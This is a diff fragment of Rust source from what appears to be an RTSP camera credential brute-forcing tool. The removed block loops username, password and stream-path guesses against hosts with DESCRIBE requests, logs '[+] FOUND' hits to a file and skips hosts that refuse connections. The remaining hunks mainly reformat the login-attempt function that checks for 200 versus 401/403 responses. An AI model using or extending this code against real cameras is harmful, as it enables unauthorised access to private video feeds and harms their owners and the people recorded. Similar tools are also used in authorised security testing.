-                let empty_headers: Vec<String> = Vec::new();
-                
-                // For mass scan, we assume standard DESCRIBE or OPTIONS is fine.
-                // try_rtsp_login defaults to OPTIONS if None, let's use DESCRIBE if we want to check stream?
-                // Actually existing tool defaults to OPTIONS unless advanced is on. OPTIONS is auth-less often?
-                // No, OPTIONS usually requires auth if server is secure.
-                
-                let res = try_rtsp_login(
-                    &addrs, 
-                    &sa.to_string(), 
-                    user, 
-                    pass, 
-                    path, 
-                    Some("DESCRIBE"), // Use DESCRIBE to be sure we can access stream info
-                    &empty_headers
-                ).await;
-
-                match res {
-                   Ok(true) => {
-                       // Success!
-                       let result_str = format!("{} -> {}:{} [path={}]", sa, user, pass, path);
-                       println!("\r{}", format!("[+] FOUND: {}", result_str).green().bold());
-                       
-                       // Save
-                       if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
-                           let _ = file.write_all(format!("{}\n", result_str).as_bytes()).await;
-                       }
-                       
-                       stats_found.fetch_add(1, Ordering::Relaxed);
-                       return; // Stop scanning this host on found
-                   }
-                   Ok(false) => {
-                       // Auth failure
-                   }
-                   Err(e) => {
-                       // Connection error or protocol error
-                       if verbose {
-                            // Only print verbose errors if really needed, prevents spam
-                       }
-                       // If connection failed (rst/timeout), often no point trying other creds?
-                       // But existing function returns Err on IO error.
-                       // We should probably stop trying this host if we get Refused/Timeout inside loop?
-                       let err_str = e.to_string().to_lowercase();
-                       if err_str.contains("refused") || err_str.contains("timeout") || err_str.contains("reset") {
-                           return; // Host dead or blocking us
-                       }
-                   }
-                }
-                // Small sleep to be polite?
-                // sleep(Duration::from_millis(50)).await; 
-            }
-        }
-    }
-}
-
 
 /// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
 async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
@@ -629,7 +577,12 @@ async fn try_rtsp_login(
 
     // Try each candidate address
     for sa in addrs {
-        match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(*sa)).await {
+        match timeout(
+            Duration::from_millis(CONNECT_TIMEOUT_MS),
+            TcpStream::connect(*sa),
+        )
+        .await
+        {
             Ok(Ok(s)) => {
                 stream = Some(s);
                 connected_sa = Some(*sa);
@@ -640,8 +593,11 @@ async fn try_rtsp_login(
                 continue;
             }
             Err(_) => {
-                 last_err = Some(std::io::Error::new(std::io::ErrorKind::TimedOut, "Connect timeout"));
-                 continue;
+                last_err = Some(std::io::Error::new(
+                    std::io::ErrorKind::TimedOut,
+                    "Connect timeout",
+                ));
+                continue;
             }
         }
     }
@@ -689,14 +645,22 @@ async fn try_rtsp_login(
     stream.write_all(request.as_bytes()).await?;
     let mut buffer = [0u8; 2048];
     // Add Read timeout
-    let n = match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), stream.read(&mut buffer)).await {
+    let n = match timeout(
+        Duration::from_millis(CONNECT_TIMEOUT_MS),
+        stream.read(&mut buffer),
+    )
+    .await
+    {
         Ok(Ok(n)) => n,
         Ok(Err(e)) => return Err(e.into()),
         Err(_) => return Err(anyhow!("Read timeout")),
     };
-    
+
     if n == 0 {
-        return Err(anyhow!("{}: server closed connection unexpectedly.", addr_display));
+        return Err(anyhow!(
+            "{}: server closed connection unexpectedly.",
+            addr_display
+        ));
     }
     let response = String::from_utf8_lossy(&buffer[..n]);
 
@@ -705,12 +669,16 @@ async fn try_rtsp_login(
     } else if response.contains("401") || response.contains("403") {
         Ok(false)
     } else {
-        // Some cameras might return 404 if path is wrong but still authorized? 
+        // Some cameras might return 404 if path is wrong but still authorized?
         // Or 400 Bad Request?
         // Safest is to treat anything not 200 as fail, but maybe check for specifc auth fail codes.
-        // If we get 404, the creds might be valid but path invalid. 
+        // If we get 404, the creds might be valid but path invalid.
         // But without positive valid signal, we assume fail.
-        Err(anyhow!("{}: unexpected RTSP response: {}", addr_display, response.lines().next().unwrap_or("")))
+        Err(anyhow!(
+            "{}: unexpected RTSP response: {}",
+            addr_display,
+            response.lines().next().unwrap_or("")
+        ))
     }
 }
 
@@ -718,18 +686,19 @@ async fn try_rtsp_login(
 /// Returns None if no path is present or if path is just "/"
 fn extract_rtsp_path(target: &str) -> Option<String> {
     let trimmed = target.trim();
-    
+
     // Remove rtsp:// scheme if present
     let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
-    
+
     // Split on first '/' to separate host:port from path
     if let Some((_, path)) = without_scheme.split_once('/') {
         // Remove query strings and fragments
-        let clean_path = path.split(|c| c == '?' || c == '#')
+        let clean_path = path
+            .split(|c| c == '?' || c == '#')
             .next()
             .unwrap_or_default()
             .trim();
-        
+
         if clean_path.is_empty() || clean_path == "/" {
             None
         } else {
